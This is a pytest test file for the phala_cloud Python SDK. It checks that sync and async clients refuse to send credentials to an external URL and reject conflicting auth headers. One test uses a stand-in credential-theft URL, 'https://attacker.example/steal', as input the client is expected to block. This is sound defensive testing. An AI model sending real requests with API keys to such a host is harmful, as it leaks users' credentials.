import httpx
import pytest

from phala_cloud import AsyncPhalaCloud, PhalaCloud, RequestError


@pytest.mark.parametrize("async_client", [False, True])
@pytest.mark.asyncio
async def test_external_url_rejected_before_sending_credentials(async_client: bool) -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        raise AssertionError("external request must not be sent")

    transport = httpx.MockTransport(handler)
    if async_client:
        async with httpx.AsyncClient(transport=transport, base_url="https://api.example") as raw:
            client = AsyncPhalaCloud(http_client=raw, api_key="secret", workspace="workspace")
            for action in (client.request, client.request_full):
                with pytest.raises(RequestError):
                    await action("GET", "https://attacker.example/steal")
    else:
        with httpx.Client(transport=transport, base_url="https://api.example") as raw:
            client_sync = PhalaCloud(http_client=raw, api_key="secret", workspace="workspace")
            for action_sync in (client_sync.request, client_sync.request_full):
                with pytest.raises(RequestError):
                    action_sync("GET", "https://attacker.example/steal")


@pytest.mark.parametrize("async_client", [False, True])
@pytest.mark.parametrize(
    "raw_header,options",
    [
        ({"X-API-Key": "other"}, {"bearer_token": "selected"}),
        ({"Authorization": "Bearer other"}, {"api_key": "selected"}),
    ],
)
@pytest.mark.asyncio
async def test_conflicting_raw_auth_rejected_for_requests_and_watch(
    monkeypatch: pytest.MonkeyPatch,
    async_client: bool,
    raw_header: dict[str, str],
    options: dict[str, str],
) -> None:
    monkeypatch.delenv("PHALA_CLOUD_API_KEY", raising=False)
    monkeypatch.delenv("PHALA_OIDC_TOKEN", raising=False)

    def handler(request: httpx.Request) -> httpx.Response:
        raise AssertionError("conflicting credentials must not be sent")

    transport = httpx.MockTransport(handler)
    if async_client:
        async with httpx.AsyncClient(
            transport=transport, base_url="https://api.example", headers=raw_header
        ) as raw:
            client = AsyncPhalaCloud(http_client=raw, **options)
            with pytest.raises(RequestError):
                await client.get("/custom")
            with pytest.raises(RequestError):
                await client.watch_cvm_state(
                    {"cvm_id": "cvm_1", "target": "running", "max_retries": 0}
                )
    else:
        with httpx.Client(
            transport=transport, base_url="https://api.example", headers=raw_header
        ) as raw:
            client_sync = PhalaCloud(http_client=raw, **options)
            with pytest.raises(RequestError):
                client_sync.get("/custom")
            with pytest.raises(RequestError):
                client_sync.watch_cvm_state(
                    {"cvm_id": "cvm_1", "target": "running", "max_retries": 0}
                )
